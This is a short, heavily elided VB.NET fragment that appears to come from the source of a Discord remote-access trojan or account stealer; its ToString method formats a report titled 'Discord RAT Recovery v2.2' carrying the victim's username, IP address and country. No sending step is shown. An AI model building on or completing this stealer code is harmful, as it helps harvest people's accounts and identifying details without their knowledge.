...
Class Account
    ...
    Public Overrides Function ToString() As String
        ...
        sb.AppendLine("Discord RAT Recovery v2.2")
        sb.AppendLine("From:        " & System.Environment.UserName)
        sb.AppendLine("IP:        " & GETIPADRESS())
        sb.AppendLine("Country:        " & Application.CurrentInputLanguage.Culture.DisplayName)
